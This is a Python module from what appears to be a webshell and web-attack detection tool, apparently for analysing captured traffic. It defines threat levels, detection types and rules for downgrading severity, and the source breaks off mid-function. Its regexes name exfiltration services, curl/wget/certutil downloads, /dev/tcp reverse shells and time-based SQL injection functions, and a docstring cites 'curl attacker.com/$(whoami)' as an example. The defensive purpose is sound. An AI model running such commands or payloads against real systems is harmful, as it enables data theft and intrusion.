# detection_result.py - 检测结果数据结构

import re
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any
from enum import Enum
import uuid


# 带外(OOB)特征：攻击效果不经由本次 HTTP 响应返回，所以响应是不是 404
# 与攻击成败无关。命中这些的条目即使返回 404 也不降威胁等级。
#
# 宁可多豁免几条也不能漏 —— 豁免只会让噪声多一点，漏掉的是真实攻击。
_OOB_MARKERS = re.compile(
    r"(?:"
    r"dnslog\.|ceye\.io|burpcollaborator|interact\.sh|\.oast\.|requestbin"
    r"|pipedream\.net|dnsbin|xip\.io|nip\.io"          # 外带平台
    r"|\bnslookup\b|\bdig\s|\bhost\s+-t\b"             # DNS 查询
    r"|\bcurl\s|\bwget\s|certutil\s+-urlcache"         # HTTP 外连
    r"|Invoke-WebRequest|\biwr\b|bitsadmin\s+/transfer"
    r"|/dev/tcp/"                                       # bash 反弹
    r")",
    re.IGNORECASE,
)


def _has_oob_marker(text: str) -> bool:
    if not text:
        return False
    return _OOB_MARKERS.search(text) is not None


# 盲注特征：攻击**成功时响应也看不出任何异常**，所以"响应正常"不能
# 用来否定它。
#
# 这类攻击的判据在响应之外：时间盲注看的是响应延迟，布尔盲注看的是
# 同一参数不同取值下响应长度的差异 —— 两者都不是单条检测能回答的。
# 在拿到那种判据之前，这里只能豁免，不能降档。
#
# 与 _OOB_MARKERS 分开是因为两者的理由不同：带外是"效果走了别的信道"，
# 盲注是"效果本来就不产生可见回显"。合并成一个表会让注释说不清楚。
_BLIND_MARKERS = re.compile(
    r"(?:"
    r"\bsleep\s*\(|\bbenchmark\s*\(|\bpg_sleep\s*\("      # MySQL / PostgreSQL
    r"|waitfor\s+delay|\bdbms_lock\.sleep|\bdbms_pipe\."  # MSSQL / Oracle
    r"|\bif\s*\(\s*\d+\s*=\s*\d+\s*,\s*sleep"             # if(1=1,sleep(5),0)
    r"|\bextractvalue\s*\(|\bupdatexml\s*\("              # 报错注入（回显在错误里）
    r")",
    re.IGNORECASE,
)


def _has_blind_marker(text: str) -> bool:
    if not text:
        return False
    return _BLIND_MARKERS.search(text) is not None


# 等级由低到高。抬档/降档比较用，与 ThreatLevel._ORDER 保持一致。
_THREAT_ORDER = ("info", "low", "medium", "high", "critical")


class ThreatLevel(Enum):
    """威胁等级"""
    INFO = "info"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

    # 由低到高。降档用，顺序和 severity_policy._PRIORITY 一致
    # （那边不能反过来 import 这里，会循环）
    _ORDER = ("info", "low", "medium", "high", "critical")

    def downgrade(self, steps: int = 1) -> "ThreatLevel":
        """降 steps 档，到 INFO 为止。steps <= 0 时原样返回。"""
        if steps <= 0:
            return self
        order = ThreatLevel._ORDER.value
        try:
            index = order.index(self.value)
        except ValueError:
            return self
        return ThreatLevel(order[max(0, index - steps)])

    @property
    def display_name(self) -> str:
        names = {
            "info": "信息",
            "low": "低危",
            "medium": "中危",
            "high": "高危",
            "critical": "严重"
        }
        return names.get(self.value, self.value)

    @property
    def color(self) -> str:
        colors = {
            "info": "#2196F3",
            "low": "#4CAF50",
            "medium": "#FF9800",
            "high": "#F44336",
            "critical": "#9C27B0"
        }
        return colors.get(self.value, "#757575")

    @classmethod
    def from_confidence(cls, confidence: str) -> "ThreatLevel":  # 从置信度转换为威胁等级
        # "suspicious" 是 calculate_confidence 里最弱的一档（权重刚过 30 分，
        # 连检测阈值 60 都没到）。它原本不在表里，靠 mapping 的默认值落到
        # MEDIUM —— 于是最不可信的一档在界面上显示成"中危"，正常 JS 被
        # 蹭到几十分就红了半屏。它属于低危。
        mapping = {
            "high": cls.HIGH,
            "medium": cls.MEDIUM,
            "low": cls.LOW,
            "suspicious": cls.LOW,
            "none": cls.INFO
        }
        return mapping.get(confidence, cls.MEDIUM)

    @classmethod
    def from_string(cls, level_str: str) -> "ThreatLevel":  # 从字符串转换为威胁等级
        level_str = level_str.lower()
        mapping = {
            "critical": cls.CRITICAL,
            "high": cls.HIGH,
            "medium": cls.MEDIUM,
            "low": cls.LOW,
            "info": cls.INFO
        }
        return mapping.get(level_str, cls.MEDIUM)


class DetectionType(Enum):
    ANTSWORD = "antsword"  # Webshell 工具
    CAIDAO = "caidao"
    BEHINDER = "behinder"
    GODZILLA = "godzilla"
    # 确实像 webshell，但拿不出任何一家的独特特征，不硬指家族
    WEBSHELL_GENERIC = "webshell_generic"
    SQLI = "sqli"  # OWASP Top 10 攻击类型
    XSS = "xss"
    RCE = "rce"
    XXE = "xxe"
    SSRF = "ssrf"
    PATH_TRAVERSAL = "path_traversal"
    COMMAND_INJECTION = "command_injection"
    DESERIALIZATION = "deserialization"
    FILE_UPLOAD = "file_upload"
    ENCRYPTED_HTTP = "encrypted_http"
    LFI = "lfi"
    RFI = "rfi"
    LDAP_INJECTION = "ldap_injection"
    SSTI = "ssti"
    ATTACK = "attack"  # 通用攻击类型
    UNKNOWN = "unknown"

    @property
    def display_name(self) -> str:
        names = {
            "antsword": "蚁剑 (AntSword)",
            "caidao": "菜刀 (Caidao)",
            "behinder": "冰蝎 (Behinder)",
            "godzilla": "哥斯拉 (Godzilla)",
            "webshell_generic": "疑似 WebShell (家族未定)",
            "sqli": "SQL注入",
            "xss": "跨站脚本 (XSS)",
            "rce": "远程代码执行 (RCE)",
            "xxe": "XML外部实体 (XXE)",
            "ssrf": "服务端请求伪造 (SSRF)",
            "path_traversal": "目录穿越",
            "command_injection": "命令注入",
            "deserialization": "反序列化漏洞",
            "file_upload": "恶意文件上传",
            "encrypted_http": "可疑加密 HTTP Payload",
            "lfi": "本地文件包含",
            "rfi": "远程文件包含",
            "ldap_injection": "LDAP注入",
            "ssti": "模板注入",
            "attack": "攻击行为",
            "unknown": "未知类型"
        }
        return names.get(self.value, self.value)

    @property
    def is_owasp(self) -> bool:
        return self.value in ['sqli', 'xss', 'rce', 'xxe', 'ssrf',
                              'path_traversal', 'command_injection', 'deserialization',
                              'file_upload', 'encrypted_http', 'lfi', 'rfi', 'ldap_injection', 'ssti',
                              'attack']

    @classmethod
    def from_type_string(cls, type_str: str) -> "DetectionType":
        type_str_lower = type_str.lower()
        # 必须排在四家前面：WEBSHELL_GENERIC_DETECTED 里不含任何家族名，
        # 但放到后面会被后续的宽松子串匹配抢走
        if "webshell_generic" in type_str_lower:
            return cls.WEBSHELL_GENERIC
        if "antsword" in type_str_lower:
            return cls.ANTSWORD
        elif "caidao" in type_str_lower:
            return cls.CAIDAO
        elif "behinder" in type_str_lower:
            return cls.BEHINDER
        elif "godzilla" in type_str_lower:
            return cls.GODZILLA
        elif "sqli" in type_str_lower or "sql" in type_str_lower:
            return cls.SQLI
        elif "xss" in type_str_lower:
            return cls.XSS
        elif "rce" in type_str_lower:
            return cls.RCE
        elif "xxe" in type_str_lower:
            return cls.XXE
        elif "ssrf" in type_str_lower:
            return cls.SSRF
        elif "path_traversal" in type_str_lower or "traversal" in type_str_lower:
            return cls.PATH_TRAVERSAL
        elif "command_injection" in type_str_lower or "cmd" in type_str_lower:
            return cls.COMMAND_INJECTION
        elif "deserialization" in type_str_lower:
            return cls.DESERIALIZATION
        elif "file_upload" in type_str_lower or "upload" in type_str_lower:
            return cls.FILE_UPLOAD
        return cls.UNKNOWN


@dataclass
class IndicatorMatch:
    name: str = ""                # 特征名称
    pattern: str = ""             # 匹配的正则模式
    weight: int = 0               # 权重分值
    matched_text: str = ""        # 匹配到的文本片段
    description: str = ""         # 特征描述


@dataclass
class DecodedPayload:
    param_name: str = ""          # 参数名
    payload_type: str = ""        # 载荷类型(Command/PHP Code等)
    decode_method: str = ""       # 解码方式(Base64/Hex等)
    encoded_sample: str = ""      # 编码样本
    decoded_content: str = ""     # 解码后的内容


@dataclass
class DetectionResult:
    id: str = field(default_factory=lambda: str(uuid.uuid4()))
    detection_type: DetectionType = DetectionType.UNKNOWN
    threat_level: ThreatLevel = ThreatLevel.MEDIUM

    # 基础信息
    timestamp: str = ""
    method: str = ""
    uri: str = ""
    source_ip: str = ""
    dest_ip: str = ""

    # v2.0 新增: 权重和置信度
    total_weight: int = 0         # 总权重
    confidence: str = "low"       # 置信度: high/medium/low/none

    # 匹配的特征列表
    indicators: List[IndicatorMatch] = field(default_factory=list)
    indicator: str = ""           # 向后兼容: 主要检测指标描述

    # 载荷信息
    payloads: List[DecodedPayload] = field(default_factory=list)
    payload: Optional[Dict[str, Any]] = None  # 向后兼容

    # 响应信息
    response_indicators: List[IndicatorMatch] = field(default_factory=list)
    response_data: Optional[str] = None
    response_sample: str = ""

    # 原始数据
    raw_data: Optional[str] = None
    raw_result: Optional[Dict] = None
    tags: List[str] = field(default_factory=list)

    # v2.1 新增: AST 语义分析结果
    ast_findings: List[Dict] = field(default_factory=list)  # AST 分析发现
    obfuscation_score: float = 0.0  # 混淆评分 0.0-1.0
    semantic_validated: bool = False  # 是否经过语义验证

    # 用于UI显示
    packet_number: int = 0
    tcp_stream: int = -1

    @property
    def success_outcome(self) -> str:
        """A/B/C 成功研判结论：confirmed / suspected / failed / unknown

        结论由 SuccessAdjudicator 写在 raw_result['success_verdict'] 里
        （见 core/success_adjudicator.adjudicate_all）。没研判过就是空串 ——
        "没判过"和"判过但没得手"必须能区分开。
        """
        raw = self.raw_result if isinstance(self.raw_result, dict) else {}
        verdict = raw.get("success_verdict")
        if not isinstance(verdict, dict):
            return ""
        return str(verdict.get("outcome") or "")

    @property
    def success_outcome_label(self) -> str:
        return {
            "confirmed": "确认得手",
            "suspected": "疑似得手",
            "failed": "未生效",
            "unknown": "证据不足",
        }.get(self.success_outcome, "")

    @property
    def success_reasons(self) -> List[str]:
        raw = self.raw_result if isinstance(self.raw_result, dict) else {}
        verdict = raw.get("success_verdict")
        if not isinstance(verdict, dict):
            return []
        return [str(r) for r in (verdict.get("reasons") or []) if r]

    # ---------------------------------------------------------- 有效威胁等级

    # 明确的失败状态码。500 不在内 —— 注入把应用打崩同样返回 500，
    # 那反而是"打中了"的迹象。口径与 success_adjudicator._FAILED_STATUS 一致。
    _FAILED_STATUS = frozenset({"400", "401", "403", "404", "405", "406", "410", "501"})

    # 降几档，按原始等级分档处理。
    #
    # 高危/严重降 1 档：这两档往往是 RCE、反序列化、上传这类**万一打成了
    # 后果很重**的类型，404 只能压低它们的优先级，不能让它们掉出视线。
    # 降到中危/高危仍在优先呈现区（severity_policy.PRIORITY_LEVELS），
    # 不会被 filter_noise 收掉。
    #
    # 中危/低危降 2 档：这两档本来就是扫描器探测的主力（目录爆破、
    # 常见路径试探），带上 404 基本可以断定是打空的，直接沉到信息级。
    _FAILED_DOWNGRADE_STEPS = {
        ThreatLevel.CRITICAL: 1,   # 严重 → 高危
        ThreatLevel.HIGH: 1,       # 高危 → 中危
        ThreatLevel.MEDIUM: 2,     # 中危 → 信息
        ThreatLevel.LOW: 2,        # 低危 → 信息
        ThreatLevel.INFO: 0,       # 已经在底了
    }

    # "研判跑过、响应也拿到了，但没有任何成功证据"的降档幅度。
    #
    # ── 为什么这一档比"明确失败"降得**更狠** ──
    #
    # 直觉上会觉得证据更弱就该降得更轻，但这两个理由回答的是**不同的问题**：
    #
    #   response_4xx          服务器拒绝了这次请求 → 攻击**没到达**目标逻辑。
    #                         可能是 WAF 挡了、路径不存在、参数被过滤。
    #                         目标本身**可能仍然脆弱**，只是这一发没打中。
    #
    #   no_success_evidence   请求被正常处理（200），响应也拿到了，三个研判
    #                         维度一个都没命中 → 攻击**到达了**目标逻辑
    #                         并且**没有产生任何效果**。
    #
    # 后者才是"这个攻击对这个目标无效"的强证据。所以降 2 档。
    #
    # 严重降到中危仍在 severity_policy.PRIORITY_LEVELS 里（严重/高危/中危），
    # 不会被 filter_noise 收掉 —— 是"不再刺眼"，不是"看不见"。
    #
    # 实测依据（166MB 标定包，独立核对过 ground truth）：1031 条 critical 里
    # 真正得手的只有 a.php 上那条菜刀链，而它已被链传播豁免；其余全是打同一个
    # 登录页的 LFI/SQLi 字典，响应清一色 200 正常页面。降 1 档时它们变成
    # 1029 条"高危"，照样占满屏幕。
    _NO_EVIDENCE_DOWNGRADE_STEPS = {
        ThreatLevel.CRITICAL: 2,   # 严重 → 中危（仍在优先呈现区）
        ThreatLevel.HIGH: 2,       # 高危 → 低危
        ThreatLevel.MEDIUM: 2,     # 中危 → 信息
        ThreatLevel.LOW: 2,        # 低危 → 信息
        ThreatLevel.INFO: 0,
    }

    # threat_downgrade_reason 返回这个前缀时，用上面那张较保守的表
    _NO_EVIDENCE_REASON = "no_success_evidence"

    # 研判确认得手时，界面等级的下限。
    #
    # 原来 effective_threat_level 只会**降**不会**升**，于是出现过这种事：
    # 一条 `cmd=whoami` 打在 WebShell 上、服务器回了执行结果，规则给的权重
    # 是 85（中危 —— 因为"发一条 whoami"这个**意图**本身确实不算重），
    # 研判判定 confirmed，界面上还是中危。而同一个包里一堆打空的扫描
    # payload 因为载荷花哨反而是高危。
    #
    # "确认打进来了"是这个工具能给出的最重要的结论，它必须能把条目顶上去，
    # 不能只是"不往下压"。原始 threat_level / total_weight 一律不动。
    _CONFIRMED_FLOOR = ThreatLevel.HIGH

    @property
    def effective_threat_level(self) -> "ThreatLevel":
        """排序、着色、噪声收敛该用的等级。

        为什么要这个派生值：`threat_level` 是在**检测阶段**定的，那时候
        `AttackDetector.detect()` 的签名里根本没有响应参数，看不到服务器回了
        什么。响应状态由 stream_worker 事后附加，研判引擎只据此把 outcome 置
        成 FAILED，**不碰 weight**（那是 success_adjudicator 的铁律：研判只增
        不减）。结果就是一条 `?id=1 union select...` 返回 404 的扫描器探测，
        威胁等级列照样是红的高危。

        所以这里不改原始判定，另算一个"结合了后果的等级"给界面用。原始
        `threat_level` 和 `total_weight` 原样保留在数据里，导出两个值都带，
        判错了能复核、能回退。

        两个方向都要走：
          确认得手 → 至少抬到 _CONFIRMED_FLOOR（见那里的说明）
          没有得手迹象 / 明确失败 → 按 threat_downgrade_reason 降档

        豁免见 `_downgrade_exemption` —— 404 不是可靠的失败证据。
        """
        if self._landed_by_self_or_chain():
            floor = self._CONFIRMED_FLOOR
            current = self.threat_level
            if _THREAT_ORDER.index(current.value) < _THREAT_ORDER.index(floor.value):
                return floor
            return current
        if not self.threat_downgrade_reason:
            return self.threat_level
        return self.threat_level.downgrade(self.threat_downgrade_steps)

    def _landed_by_self_or_chain(self) -> bool:
        """这条检测是否属于一次**已证实得手**的攻击。

        两种都算，因为对"该不该顶到眼前"这个问题它们是等价的：

          自己确认    这一条本身有客观后果证据
          所属链确认  它是一次已证实得手的攻击链的组成部分

        后者不可省。实测 DVWA 的链：
            frame 68  POST /vulnerabilities/upload/   ← 上传 ma.php，confirmed
            frame 93  GET  /hackable/uploads/ma.php   ← 访问它，自己看不出名堂
        frame 93 是攻击真正生效的那一步，但它单独看只是"GET 了一个 php
        文件，响应 200"，研判给 unknown。只认自己的结论，它就停在低危，
        比上传那一条低两档 —— 而分析员最该点开的恰恰是它。
        """
        if self.success_outcome == "confirmed":
            return True
        raw = self.raw_result if isinstance(self.raw_result, dict) else {}
        return str(raw.get("chain_outcome") or "") == "confirmed"

    @property
    def threat_upgrade_reason(self) -> str:
        """因为"确认得手"而被抬档时的说明。空串 = 没抬。"""
        if not self._landed_by_self_or_chain():
            return ""
        if self.effective_threat_level is self.threat_level:
            return ""
        if self.success_outcome == "confirmed":
            return "confirmed_landed"
        return "confirmed_chain"

    @property
    def threat_downgrade_steps(self) -> int:
        """这条实际降了几档。0 = 没降。界面提示文案要用到。"""
        reason = self.threat_downgrade_reason
        if not reason:
            return 0
        table = (self._NO_EVIDENCE_DOWNGRADE_STEPS
                 if reason == self._NO_EVIDENCE_REASON
                 else self._FAILED_DOWNGRADE_STEPS)
        return table.get(self.threat_level, 0)

    @property
    def threat_downgrade_reason(self) -> str:
        """为什么降档。空串 = 没降，界面和报告据此决定要不要显示说明。

        两档降档理由，强度不同：

          response_<code>       服务器明确拒绝（404/403…）—— 正面的失败证据
          no_success_evidence   研判跑完、响应也拿到了，但 A/B/C 三个维度
                                一个都没命中 —— 证据的**缺席**

        后者是这次新增的，理由见 _NO_EVIDENCE_DOWNGRADE_STEPS 的注释：
        真实攻击里打空的 payload 绝大多数返回 200，只认失败状态码等于
        整个机制对最常见的情形完全失效。

        三条前提缺一不可，都是为了不把"不知道"当成"失败"：
          1. 研判确实跑过（outcome 非空）—— 空串是"没研判"，不是"没得手"
          2. 响应确实配上了（status 非空）—— 抓不到响应同样是"不知道"
          3. 没有命中豁免（盲注/带外/反弹/主机证据/AST 污点）
        """
        raw = self.raw_result if isinstance(self.raw_result, dict) else {}
        status = str(raw.get("response_status") or "").strip()
        outcome = self.success_outcome

        # 研判给出了正面证据，一切降档都免谈
        if outcome in ("confirmed", "suspected"):
            return ""

        if self._downgrade_exemption():
            return ""

        # 服务器明确拒绝
        if status in self._FAILED_STATUS:
            return f"response_{status}"

        # 研判跑过、响应也拿到了，却没有任何成功迹象。
        # outcome 为空串时**不降** —— 那是压根没研判过（例如 AST 阶段
        # 新产出的检测，见 stream_worker._fetch_http_responses 的说明），
        # 把它当失败会凭空压低一整批从没被研判看过的条目。
        if outcome == "unknown" and status:
            return self._NO_EVIDENCE_REASON

        return ""

    @property
    def threat_downgrade_note(self) -> str:
        """降档说明，一句话，给界面提示和报告用。

        存在的理由：`threat_downgrade_reason` 是**机器可读的标识**
        （`response_404` / `no_success_evidence`），不是人话。界面和导出
        原来都写死了 `reason.replace("response_", "")` 拿状态码 —— 那在
        只有一种降档原因时能凑合，多一种就会显示成
        「服务器返回 no_success_evidence」这种病句。

        新增降档原因时**必须**在这里补一条对应文案，否则界面会把标识
        原样吐给用户。
        """
        reason = self.threat_downgrade_reason
        if not reason:
            return ""
        if reason == self._NO_EVIDENCE_REASON:
            return "响应正常，研判未发现任何得手迹象"
        if reason.startswith("response_"):
            return f"服务器返回 {reason[len('response_'):]}、研判为未生效"
        return reason

    @property
    def threat_downgrade_badge(self) -> str:
        """降档原因的短标签（报告表格里跟在"原严重"后面那个）。"""
        reason = self.threat_downgrade_reason
        if not reason:
            return ""
        if reason == self._NO_EVIDENCE_REASON:
            return "无得手迹象"
        if reason.startswith("response_"):
            return reason[len("response_"):]
        return reason

    def _downgrade_exemption(self) -> str:
        """即使响应是 404 也不降档的情况，返回豁免原因（空串 = 不豁免）。

        404 只说明"这个 URL 没返回内容"，不等于"攻击没成功"：

          盲注    时间/布尔盲注本来就不看回显，页面 404 不影响注入执行
          带外    curl attacker.com/$(whoami) 把数据带走了，响应是什么无所谓
          WAF     部分 WAF 拦截后返回 404 而非 403，"被拦"≠"目标没有漏洞"

        success_adjudicator.py 里维度 C 已经明确豁免过 404（注释原文：
        "注入把页面打成 404、同时触发反弹 shell 是完全可能的"），这里沿用
        同一套判据。
        """
        raw = self.raw_result if isinstance(self.raw_result, dict) else {}
        verdict = raw.get("success_verdict")
        verdict = verdict if isinstance(verdict, dict) else {}
        dimensions = set(verdict.get("dimensions") or [])
        evidence = verdict.get("evidence") or {}

        # 维度 C：服务器掉头往外连了。这条不豁免会造成实打实的漏检。
        if "C" in dimensions or (isinstance(evidence, dict)
                                 and evidence.get("reverse_shell")):
            return "reverse_shell"

        # 维度 D：EDR 在主机侧看到了对应的进程/文件/连接
        if "D" in dimensions:
            return "host_evidence"

        # 所属攻击链上有别的条目已被证实得手。
        #
        # 研判是逐条下结论的，攻击却是成链发生的。实测：一个 webshell
        # (`POST /images/article/a.php`) 在抓包里被访问 19 次，逐条研判
        # 只认出 1 条 confirmed —— 另外 18 次单独看都只是"POST 了个 php
        # 文件，响应 200"，看不出名堂。但它们是同一条链上的同一次利用。
        #
        # 链的粒度是 (来源 IP, 目标 IP, 规范化路径)，见 core/attack_chain。
        # 用路径而不是只用来源：一个攻击者扫 3954 个 URI、其中一个得手，
        # 不能把另外 3953 个全部"救"回高危 —— 那是换一种误报。
        if str(raw.get("chain_outcome") or "") in ("confirmed", "suspected"):
            return "attack_chain"

        # AST 确认污点流入危险函数 / 语义判定为 WebShell
        if raw.get("semantic_validated"):
            return "tainted_sink"
        analysis = raw.get("ast_analysis")
        if isinstance(analysis, dict):
            for item in analysis.get("results") or []:
                if isinstance(item, dict) and item.get("is_likely_webshell"):
                    return "ast_webshell"

        # 带外：攻击效果不经由本次 HTTP 响应返回
        if _has_oob_marker(self._searchable_request_text(raw)):
            return "out_of_band"

        # 盲注：攻击成功时响应也看不出异常，"响应正常"不能否定它。
        # 这条对新增的 no_success_evidence 降档尤其关键 —— 时间盲注
        # 打成了同样是 200 + 正常页面，不豁免就会被当成打空的。
        if _has_blind_marker(self._searchable_request_text(raw)):
            return "blind_injection"

        return ""

    def _searchable_request_text(self, raw: Dict) -> str:
        parts = [
            str(self.uri or ""),
            str(raw.get("raw_request_body_full") or raw.get("raw_request_body") or ""),
        ]
        decoded = raw.get("payloads")
        if isinstance(decoded, dict):
            inner = decoded.get("decoded")
            if isinstance(inner, dict):
                parts.append(str(inner.get("decoded") or ""))
        return "\n".join(p for p in parts if p)

    def to_table_row(self) -> List[str]:
        # 特征摘要
        indicator_str = self.indicator
        if not indicator_str and self.indicators:
            indicator_str = ", ".join([i.name for i in self.indicators[:3]])
            if len(self.indicators) > 3:
                indicator_str += f" (+{len(self.indicators) - 3})"

        tags_str = ", ".join(self.tags[:2]) if self.tags else ""
        if len(self.tags) > 2:
            tags_str += f" (+{len(self.tags) - 2})"

        return [
            self.threat_level.display_name,
            # 研判排在威胁等级right after：应急现场先问"打成了没有"，
            # 再问"像不像攻击"
            self.success_outcome_label,
            self.detection_type.display_name,
            self.method,
            self.uri[:50] + "..." if len(self.uri) > 50 else self.uri,
            indicator_str,
            tags_str,
            f"{self.total_weight}" if self.total_weight > 0 else "",
            self.timestamp
        ]

    @staticmethod
    def table_headers() -> List[str]:
        return ["威胁等级", "研判", "类型", "方法", "URI", "检测指标", "攻击标签", "权重", "时间戳"]

    @classmethod
    def from_webshell_result(cls, raw: Dict, detection_type: DetectionType) -> "DetectionResult":
        """从webshell_detect结果创建"""
        confidence = raw.get("confidence", "low")
        threat_level = ThreatLevel.from_confidence(confidence)

        indicators = []
        for ind in raw.get("indicators", []):
            indicators.append(IndicatorMatch(
                name=ind.get("name", ""),
                pattern=ind.get("pattern", ""),
                weight=ind.get("weight", 0),
                matched_text=ind.get("matched_text", ""),
                description=ind.get("description", "")
            ))

        response_indicators = []
        for ind in raw.get("response_indicators", []):
            if isinstance(ind, dict):
                response_indicators.append(IndicatorMatch(
                    name=ind.get("name", ""),
                    pattern=ind.get("pattern", ""),
                    weight=ind.get("weight", 0),
                    description=ind.get("description", "")
                ))
            elif isinstance(ind, str):
                response_indicators.append(IndicatorMatch(name=ind))

        payloads = []
        raw_payloads = raw.get("payloads", {})
        if isinstance(raw_payloads, dict):
            for param_name, payload_info in raw_payloads.items():
                if isinstance(payload_info, dict):
                    payloads.append(DecodedPayload(
                        param_name=param_name,
                        payload_type=payload_info.get("type", ""),
                        decode_method=payload_info.get("method", ""),
                        encoded_sample=payload_info.get("encoded_sample", ""),
                        decoded_content=payload_info.get("decoded", payload_info.get("decoded_content", ""))
                    ))

        indicator_str = ""
        if indicators:
            top_indicators = sorted(indicators, key=lambda x: -x.weight)[:3]
            indicator_str = ", ".join([i.name for i in top_indicators])

        return cls(
            detection_type=detection_type,
            threat_level=threat_level,
            method=raw.get("method", ""),
            uri=raw.get("uri", "") or "",
            total_weight=raw.get("total_weight", 0),
            confidence=confidence,
            indicators=indicators,
            indicator=indicator_str,
            payloads=payloads,
            payload=raw_payloads if raw_payloads else None,
            response_indicators=response_indicators,
            response_data=raw.get("response_sample", ""),
            response_sample=raw.get("response_sample", ""),
            raw_result=raw
        )

    @classmethod
    def from_antsword_result(cls, raw: Dict) -> "DetectionResult":
        # 新格式走通用方法
        if "total_weight" in raw or "confidence" in raw:
            return cls.from_webshell_result(raw, DetectionType.ANTSWORD)

        # 旧格式兼容
        return cls(
            detection_type=DetectionType.ANTSWORD,
            threat_level=ThreatLevel.HIGH,
            method=raw.get("method", ""),
            uri=raw.get("uri", "") or "",
            indicator=raw.get("indicator", ""),
            payload=raw.get("payload"),
            response_data=raw.get("response_body"),
            raw_result=raw
        )

    @classmethod
    def from_caidao_result(cls, raw: Dict) -> "DetectionResult":
        # 新格式走通用方法
        if "total_weight" in raw or "confidence" in raw:
            return cls.from_webshell_result(raw, DetectionType.CAIDAO)

        # 旧格式兼容
        return cls(
            detection_type=DetectionType.CAIDAO,
            threat_level=ThreatLevel.HIGH,
            method=raw.get("method", ""),
            uri=raw.get("uri", "") or "",
            indicator=raw.get("indicator", ""),
            payload=raw.get("payload") or raw.get("z0_decoded"),
            raw_result=raw
        )

    @classmethod
    def from_behinder_result(cls, raw: Dict) -> "DetectionResult":
        return cls.from_webshell_result(raw, DetectionType.BEHINDER)

    @classmethod
    def from_godzilla_result(cls, raw: Dict) -> "DetectionResult":
        return cls.from_webshell_result(raw, DetectionType.GODZILLA)

    @classmethod
    def from_generic_webshell_result(cls, raw: Dict) -> "DetectionResult":
        """像 webshell 但没有家族独特特征的那一类"""
        return cls.from_webshell_result(raw, DetectionType.WEBSHELL_GENERIC)

    @classmethod
    def from_attack_result(
        cls,
        attack_result,
        method: str = "",
        uri: str = "",
        source_ip: str = "",
        dest_ip: str = "",
        timestamp: str = "",
        packet_number: int = 0
    ) -> "DetectionResult":
        """从 AttackDetector.detect() 返回的 dict 创建"""
        # 攻击类型映射
        attack_type_mapping = {
            # AttackType.value
            "sqli": DetectionType.SQLI,
            "xss": DetectionType.XSS,
            "rce": DetectionType.RCE,
            "xxe": DetectionType.XXE,
            "ssrf": DetectionType.SSRF,
            "path_traversal": DetectionType.PATH_TRAVERSAL,
            "command_injection": DetectionType.COMMAND_INJECTION,
            "deserialization": DetectionType.DESERIALIZATION,
            "file_upload": DetectionType.FILE_UPLOAD,
            "encrypted_http": DetectionType.ENCRYPTED_HTTP,
            "lfi": DetectionType.LFI,
            "antsword": DetectionType.ANTSWORD,
            "caidao": DetectionType.CAIDAO,
            "behinder": DetectionType.BEHINDER,
            "godzilla": DetectionType.GODZILLA,
            "webshell_generic": DetectionType.WEBSHELL_GENERIC,
            # 显示名称
            "SQL Injection": DetectionType.SQLI,
            "Cross-Site Scripting": DetectionType.XSS,
            "XML External Entity": DetectionType.XXE,
            "Malicious File Upload": DetectionType.FILE_UPLOAD,
            "Command Injection": DetectionType.COMMAND_INJECTION,
            "Path Traversal": DetectionType.PATH_TRAVERSAL,
            "Server-Side Request Forgery": DetectionType.SSRF,
            "Local File Inclusion": DetectionType.LFI,
            "Remote File Inclusion": DetectionType.RFI,
            "LDAP Injection": DetectionType.LDAP_INJECTION,
            "Server-Side Template Injection": DetectionType.SSTI,
            "Insecure Deserialization": DetectionType.DESERIALIZATION,
            "Remote Code Execution": DetectionType.RCE,
        }

        # 兼容 dict 和 object
        is_dict = isinstance(attack_result, dict)

        detection_type = DetectionType.ATTACK
        if is_dict:
            det_type_str = attack_result.get('detection_type', '')
            detection_type = attack_type_mapping.get(det_type_str, DetectionType.ATTACK)

            # 未匹配时尝试从 indicators 的 pattern_name 推断
            if detection_type == DetectionType.ATTACK and attack_result.get('indicators'):
                for ind in attack_result['indicators']:
                    pattern_name = ind.get('name', '')
                    # pattern_name 格式: "sqli:union_select"
                    if ':' in pattern_name:
                        attack_prefix = pattern_name.split(':')[0]
                        inferred_type = attack_type_mapping.get(attack_prefix)
                        if inferred_type:
                            detection_type = inferred_type
                            break
        else:
            # object 模式 (向后兼容)
            if hasattr(attack_result, 'attack_types') and attack_result.attack_types:
                primary_attack = attack_result.attack_types[0]
                attack_value = primary_attack.value if hasattr(primary_attack, 'value') else str(primary_attack)
                detection_type = attack_type_mapping.get(attack_value, DetectionType.ATTACK)

        # 转换威胁等级
        risk_level_mapping = {
            "critical": ThreatLevel.CRITICAL,
            "high": ThreatLevel.HIGH,
            "medium": ThreatLevel.MEDIUM,
            "low": ThreatLevel.LOW,
            "info": ThreatLevel.INFO,
        }

        if is_dict:
            risk_str = attack_result.get('threat_level', 'medium')
            threat_level = risk_level_mapping.get(risk_str, ThreatLevel.MEDIUM)
        else:
            threat_level = risk_level_mapping.get(
                getattr(attack_result, 'risk_level', 'medium'), ThreatLevel.MEDIUM
            )

        # 转换匹配特征
        indicators = []
        if is_dict:
            for ind in attack_result.get('indicators', []):
                indicators.append(IndicatorMatch(
                    name=ind.get('name', ''),
                    pattern=ind.get('pattern', ''),
                    weight=ind.get('weight', 0),
                    matched_text=ind.get('matched_text', ''),
                    description=ind.get('description', '')
                ))
        else:
            for match in getattr(attack_result, 'matches', []):
                indicators.append(IndicatorMatch(
                    name=match.signature.name,
                    pattern=match.signature.pattern,
                    weight=match.signature.weight,
                    matched_text=match.matched_text,
                    description=match.signature.description
                ))

        # 构建指标描述
        indicator_str = ""
        if indicators:
            top_indicators = sorted(indicators, key=lambda x: -x.weight)[:3]
            indicator_str = ", ".join([i.name for i in top_indicators])

        # 标签
        tags = []
        if is_dict:
            tags = list(attack_result.get('tags', []))

            # 从 indicators 生成攻击类型标签
            attack_type_tags = set()
            for ind in attack_result.get('indicators', []):
                pattern_name = ind.get('name', '')
                if ':' in pattern_name:
                    attack_prefix = pattern_name.split(':')[0]
                    tag_mapping = {
                        'sqli': 'SQL注入',
                        'xss': 'XSS攻击',
                        'rce': '远程代码执行',
                        'xxe': 'XXE攻击',
                        'ssrf': 'SSRF攻击',
                        'path_traversal': '目录穿越',
                        'command_injection': '命令注入',
                        'deserialization': '反序列化',
                        'file_upload': '文件上传',
                    }
                    if attack_prefix in tag_mapping:
                        attack_type_tags.add(tag_mapping[attack_prefix])

            # 追加攻击类型标签
            tags.extend(list(attack_type_tags))
        else:
            for attack_type in getattr(attack_result, 'attack_types', []):
